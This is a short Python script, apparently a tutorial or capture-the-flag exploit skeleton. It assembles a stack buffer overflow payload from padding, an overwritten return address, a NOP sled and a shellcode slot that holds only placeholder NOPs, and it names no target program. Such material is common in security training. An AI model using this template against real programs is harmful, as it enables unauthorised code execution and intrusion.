import struct

buffer_data = 'A' * 147
eip_address = struct.pack("<I", 0x40041d)
nop_sled = '\x90' * 50
shell_code = '\x90' * 120

exploit = buffer_data + eip_address + nop_sled + shell_code